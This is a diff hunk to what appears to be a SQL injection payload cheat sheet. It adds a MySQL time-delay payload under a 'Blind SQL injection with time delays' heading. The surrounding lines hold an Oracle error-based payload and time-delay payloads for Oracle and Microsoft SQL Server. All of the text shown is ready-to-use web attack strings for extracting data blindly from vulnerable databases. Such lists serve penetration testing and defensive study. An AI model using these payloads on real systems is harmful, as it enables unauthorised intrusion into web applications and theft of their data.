@@ -80,6 +80,8 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 
 #Blind SQL injection with time delays
 
+' UNION SELECT SLEEP(5);-- -
+
 ' || (dbms_pipe.receive_message(('a'),10))-- - >> Oracle
 
 ' || (WAITFOR DELAY '0:0:10')-- - >> Microsoft
